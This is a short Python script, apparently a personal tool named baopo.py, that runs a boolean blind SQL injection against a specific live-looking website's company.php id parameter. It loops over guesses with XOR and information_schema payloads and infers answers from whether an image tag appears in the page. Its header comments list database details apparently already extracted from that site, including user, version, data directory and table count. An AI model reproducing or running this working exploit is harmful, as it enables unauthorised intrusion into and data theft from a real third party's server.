#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2019/7/15 20:54
# @Author  : qiang
# @File    : baopo.py
import requests
import re
# 数据库 7 sanying
#user 17 sanying@127.0.0.1
#version 16 5.1.73-community
#datadir 14  D:\mysql\Data
#version_compile_os 5  win32
#17个表
def load_baidu(i):

    # base_url = 'http://www.shsuna.com/en/company.php?id=35^(ascii(mid(@@version_compile_os,'+str(i)+',1))={})%20--'
    base_url = 'http://www.shsuna.com/en/company.php?id=35^((select+count(*)+from+information_schema.tables+where+table_schema%3ddatabase())={})%20--'

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; ) AppleWebKit/534.12 (KHTML, like Gecko) Maxthon/3.0 Safari/534.12'
    }

    for i in range(0,128):
        url = base_url.format(i)
        response = requests.get(url, headers=headers)
        # content属性 返回的类型 是bytes,加了decode就是str了
        data = response.content.decode('utf-8')
        # text 属性 返回的类型 是文本str
        data = response.text

        pattern = re.compile('<td valign="top"><p><img alt="" src="(.*?)" /></p>')
        src = pattern.findall(data)

        if src==[]:
            print(i)
            # print(chr(i))
    return
# for i in range(1,16):
#     load_baidu(i)
load_baidu(1)
